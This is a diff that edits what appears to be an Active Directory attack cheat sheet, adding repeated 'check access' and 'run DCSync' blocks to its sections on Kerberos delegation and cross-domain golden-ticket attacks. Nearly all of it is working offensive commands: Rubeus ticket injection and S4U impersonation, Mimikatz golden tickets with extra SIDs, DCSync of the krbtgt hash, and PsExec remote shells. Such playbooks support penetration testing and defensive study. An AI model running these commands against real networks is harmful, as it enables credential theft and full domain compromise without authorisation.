@@ -627,6 +627,13 @@ Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 .\Rubeus.exe ptt /ticket:<TICKET FILE>
 ```
 
+#### Check access on target machine
+```
+ls \\<FQDN>\c$
+Enter-PSSession -ComputerName <FQDN>
+ .\PsExec64.exe \\<COMPUTERNAME> cmd
+```
+
 #### Run DCSync to get credentials:
 - use ```/all``` instead of ```/user``` to list all users
 ```
@@ -670,9 +677,10 @@ cat dc_ticket.txt | tr -d "\n" | tr -d " "
 .\Rubeus.exe ptt /ticket:<TICKET>
 ```
 
-#### Then DCSync
+#### Run DCSync to get credentials:
+- use ```/all``` instead of ```/user``` to list all users
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
 ### Constrained Delegation
@@ -716,6 +724,13 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 .\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:<USER> /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
 ```
 
+#### Check access on target machine
+```
+ls \\<FQDN>\c$
+Enter-PSSession -ComputerName <FQDN>
+ .\PsExec64.exe \\<COMPUTERNAME> cmd
+```
+
 #### Run DCSync to get credentials:
 - use ```/all``` instead of ```/user``` to list all users
 ```
@@ -730,18 +745,17 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 .\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /rc4:<NTLM> /altservice:<SECOND SERVICE> /ptt 
 ```
 
-#### Rubeus Dump TGT + ask TGS for CIFS
+#### Check access on target machine
 ```
-.\Rubeus.exe triage
-.\Rubeus.exe dump \luid:<LUID> \service:<SERVICE>
-.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /ticket:<BASE64 TGT> /nowrap
+ls \\<FQDN>\c$
+Enter-PSSession -ComputerName <FQDN>
+ .\PsExec64.exe \\<COMPUTERNAME> cmd
 ```
 
-#### Using mimikatz to inject TGS ticket and executing DCsync
+#### Run DCSync to get credentials:
 - use ```/all``` instead of ```/user``` to list all users
 ```
-Invoke-Mimikatz -Command '"Kerberos::ptt <KIRBI FILE>"'
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
 ### Resource Based Constrained Delegation
@@ -1512,11 +1526,17 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CH
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
 ```
 
-#### Check access to server
+#### Check access on target machine
 ```
-dir \\<FQDN PARENT DC>\C$ 
-Enter-PSSession <COMPUTERNAME>
-.\PsExec64.exe \\<COMPUTERNAME> cmd
+ls \\<FQDN>\c$
+Enter-PSSession -ComputerName <FQDN>
+ .\PsExec64.exe \\<COMPUTERNAME> cmd
+```
+
+#### Run DCSync to get credentials:
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
 ### Krbtgt hash
@@ -1541,11 +1561,17 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CH
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /aes256:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /startoffset:-10 /endin:600 /renewmax:10080 /ptt"'
 ```
 
-#### Check access to server
+#### Check access on target machine
 ```
-dir \\<FQDN PARENT DC>\C$ 
-Enter-PSSession <COMPUTERNAME>
-.\PsExec64.exe \\<COMPUTERNAME> cmd
+ls \\<FQDN>\c$
+Enter-PSSession -ComputerName <FQDN>
+ .\PsExec64.exe \\<COMPUTERNAME> cmd
+```
+
+#### Run DCSync to get credentials:
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
 ## Crossforest attacks
